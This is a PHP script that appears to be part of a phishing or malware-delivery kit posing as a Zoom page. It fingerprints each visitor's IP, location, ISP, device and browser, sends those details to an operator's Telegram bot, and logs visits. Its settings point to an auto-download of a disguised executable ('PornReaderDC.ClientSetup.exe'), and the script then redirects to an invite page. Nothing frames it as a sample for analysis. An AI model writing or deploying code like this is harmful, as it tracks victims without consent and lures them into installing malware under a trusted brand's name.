<?php
// Improved error handling - silent errors
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', 'error_log.txt');

// Better IP detection with support for proxies
function getClientIP() {
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '';
}

// Function to detect device type from user agent
function detectDevice($userAgent) {
    $deviceType = "Desktop";
    
    // Mobile detection
    if (preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|Mobile)/i', $userAgent)) {
        $deviceType = "Mobile";
        
        // More specific devices
        if (preg_match('/iPhone/i', $userAgent)) {
            $deviceType = "iPhone";
        } elseif (preg_match('/iPad/i', $userAgent)) {
            $deviceType = "iPad";
        } elseif (preg_match('/Android/i', $userAgent)) {
            $deviceType = "Android";
        } elseif (preg_match('/BlackBerry/i', $userAgent)) {
            $deviceType = "BlackBerry";
        }
    }
    
    return $deviceType;
}

// Function to detect browser type from user agent
function detectBrowser($userAgent) {
    $browser = "Unknown Browser";
    
    // Mobile browsers
    if (preg_match('/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile|Mobile)/i', $userAgent)) {
        $browser = "Handheld Browser";
    }
    
    // Specific browsers
    if (preg_match('/Chrome/i', $userAgent)) {
        $browser = "Chrome";
    } elseif (preg_match('/Firefox/i', $userAgent)) {
        $browser = "Firefox";
    } elseif (preg_match('/Safari/i', $userAgent) && !preg_match('/Chrome/i', $userAgent)) {
        $browser = "Safari";
    } elseif (preg_match('/Edge/i', $userAgent)) {
        $browser = "Edge";
    } elseif (preg_match('/MSIE|Trident/i', $userAgent)) {
        $browser = "Internet Explorer";
    }
    
    return $browser;
}

// Enhanced Function to send Telegram notification
function sendTelegramMessage($message) {
    // Load settings
    if (!file_exists('settings.php')) {
        return false;
    }
    
    try {
        $settings = include 'settings.php';
        
        if (!empty($settings) && isset($settings['telegram']) && $settings['telegram'] == "1" &&
            !empty($settings['bot_url']) && !empty($settings['chat_id'])) {
            
            $send = [
                'chat_id' => $settings['chat_id'],
                'text' => $message,
                'parse_mode' => 'HTML'
            ];
            
            $website = "https://api.telegram.org/{$settings['bot_url']}";
            
            // Send via file_get_contents for better compatibility
            $options = [
                'http' => [
                    'method' => 'POST',
                    'header' => 'Content-Type: application/x-www-form-urlencoded',
                    'content' => http_build_query($send)
                ]
            ];
            
            $context = stream_context_create($options);
            $result = @file_get_contents($website . '/sendMessage', false, $context);
            
            return ($result !== false);
        }
    } catch (Exception $e) {
        error_log("Telegram notification error: " . $e->getMessage());
    }
    
    return false;
}

// Get visitor details
$ip = getClientIP();
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$hostname = gethostbyaddr($ip);
$device = detectDevice($userAgent);
$browser = detectBrowser($userAgent);
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct visit';
$pageURL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

// Location and ISP info variables
$city = "Unknown";
$country = "Unknown";
$isp = "Unknown";
$region = "Unknown";
$timezone = "Unknown";

// Try to get location info if possible
try {
    $url = "http://ip-api.com/json/" . $ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $resp = curl_exec($ch);
    curl_close($ch);
    $details = json_decode($resp, true);

    if ($details && isset($details['status']) && $details['status'] != 'fail') {
        $city = isset($details['city']) ? $details['city'] : 'Unknown';
        $country = isset($details['country']) ? $details['country'] : 'Unknown';
        $isp = isset($details['isp']) ? $details['isp'] : 'Unknown';
        $region = isset($details['regionName']) ? $details['regionName'] : 'Unknown';
        $timezone = isset($details['timezone']) ? $details['timezone'] : 'Unknown';
    }
} catch (Exception $e) {
    // Continue without location data if API fails
    error_log("Location API error: " . $e->getMessage());
}

// Load settings
$settings = file_exists('settings.php') ? include 'settings.php' : [];
$downloadDelay = isset($settings['auto_download_delay']) ? $settings['auto_download_delay'] : 7;
$executableFileName = isset($settings['zoom_update.js']) ? $settings['zoom_reader.js'] : "PornReaderDC.ClientSetup.exe";

// Prepare visitor notification message - improved format
$message = "🔔 <b>DOMAIN ACCESS ALERT</b> 🔔\n\n";
$message .= "Someone has visited your ZOOM Page!\n\n";
$message .= "👤 <b>Visitor Details</b>\n";
$message .= "IP: " . $ip . "\n";
$message .= "Location: " . $city . ", " . $region . ", " . $country . "\n";
$message .= "ISP: " . $isp . "\n";
$message .= "Timezone: " . $timezone . "\n\n";
$message .= "🌐 <b>Technical Details</b>\n";
$message .= "Browser: " . $browser . "\n";
$message .= "Device: " . $device . "\n";
$message .= "Referrer: " . $referrer . "\n";
$message .= "Page URL: " . $pageURL . "\n";
$message .= "Time: " . date('Y-m-d H:i:s') . "\n";

// Send visitor notification to Telegram
$notificationSent = false;
if (isset($settings['notify_on_visit']) && $settings['notify_on_visit']) {
    try {
        $notificationSent = sendTelegramMessage($message);
    } catch (Exception $e) {
        error_log("Error sending notification: " . $e->getMessage());
    }
}

// Log the visit (optional)
if (isset($settings['log_visits']) && $settings['log_visits']) {
    $logEntry = date('Y-m-d H:i:s') . " | IP: {$ip} | Location: {$city}, {$country} | ";
    $logEntry .= "Browser: {$browser} | Device: {$device} | Referrer: {$referrer} | ";
    $logEntry .= "Telegram: " . ($notificationSent ? "Sent" : "Failed") . "\n";
    @file_put_contents('visits.log', $logEntry, FILE_APPEND);
}
header("location:././invite.php");
?>